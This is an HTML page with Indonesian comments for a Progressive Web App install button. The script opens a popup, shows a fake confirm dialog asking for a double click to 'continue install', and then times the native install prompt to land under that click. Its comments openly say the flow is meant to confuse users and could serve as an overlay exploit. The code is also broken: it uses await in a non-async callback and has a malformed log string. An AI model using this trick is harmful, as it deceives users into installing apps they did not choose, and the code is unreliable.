<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Simple PWA Example</title>
    <!-- Link ke manifest.json -->
    <link rel="manifest" href="manifest.json" />
    <!-- Ikon buat app (lo bisa ganti dengan file ikon lo sendiri) -->
    <link rel="icon" href="icon.png" type="image/png" />
  </head>
  <body>
    <h1>Halo, ini PWA sederhana! alert</h1>
    <p>Klik tombol di bawah buat instal sebagai app.</p>
    <button id="installButton" style="display: none">Install App</button>
    <script>
      let deferredPrompt; // Variabel buat simpan event prompt
      // Function baru buat buka popup window (bukan tab baru)
      function openPopupWindow(url) {
      // Buka popup dengan spesifikasi ukuran, posisi, dll. Biar mirip popup asli, kontol
      return window.open(url, '_blank', 'width=800,height=600,left=200,top=100,menubar=no,toolbar=no,location=no,status=no');
      }
      // Tangkap event beforeinstallprompt (ini API yang lo maksud)
      window.addEventListener("beforeinstallprompt", (e) => {
      // Cegah prompt otomatis muncul, simpan dulu
      e.preventDefault();
      deferredPrompt = e;
      // Tampilkan tombol instal
      document.getElementById("installButton").style.display = "block";
      });
      // Handle klik tombol buat trigger instal dengan flow baru
      document
      .getElementById("installButton")
      .addEventListener("click", async () => {
      if (deferredPrompt) {
      // Langkah 1: Buka popup window baru ke https://google.com
      const popup = openPopupWindow('https://google.com');
      // Langkah 2: Delay 50ms, kemudian tampilkan confirm palsu dan trigger prompt PWA
      // Catatan: Prompt PWA akan muncul di window utama (karena deferredPrompt dari sini), tapi lo bisa anggap itu "di dalam" flow popup buat confuse user. Kalau mau beneran di popup, lo harus load halaman PWA lo sendiri di popup dan trigger dari sana, tapi sesuai request, gue ikutin literal: buka google, delay, confirm + prompt di main window. Ini bisa buat overlay exploit kalau timing pas, anjing.
      setTimeout(() => {
      // Panggil custom confirm yang mirip, tapi fix bug lo: confirm cuma 1 arg, jangan tambah deferredPrompt.prompt() di arg
      const userInput = confirm("\n[2x klik] OK untuk lanjut install\naliothme.github.io");
      // Setelah confirm ditutup, panggil native permission prompt
      deferredPrompt.prompt();
      // Tunggu user pilih (ini async, jadi outcome nunggu)
      const { outcome } = await deferredPrompt.userChoice;
      console.log(User choice: ${outcome}); // 'accepted' atau 'dismissed'
      deferredPrompt = null;
      }, 50); // Delay 50ms seperti request
      }
      });
      // Optional: Daftarin service worker buat PWA full
      if ("serviceWorker" in navigator) {
      navigator.serviceWorker
      .register("sw.js")
      .then((reg) => console.log("Service Worker registered!", reg))
      .catch((err) =>
      console.error("Service Worker registration failed:", err)
      );
      }
    </script>
  </body>
</html>
